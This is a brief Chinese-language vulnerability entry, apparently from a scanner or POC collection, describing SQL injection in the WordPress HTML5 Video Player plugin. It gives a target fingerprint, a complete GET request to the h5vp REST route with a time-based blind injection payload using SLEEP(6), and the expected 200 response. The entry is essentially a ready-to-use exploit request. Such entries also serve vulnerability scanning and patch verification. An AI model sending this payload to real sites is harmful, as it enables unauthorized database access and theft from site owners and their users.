# WordpressHTML5VideoPlayer插件存在SQL注入漏洞

WordPress ｜ SQL注入 ｜ —
- **指纹**：`"wordpress"`
- **请求**：`GET /?rest_route=/h5vp/v1/view/1&id=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+- HTTP/1.1`
- **响应特征**：200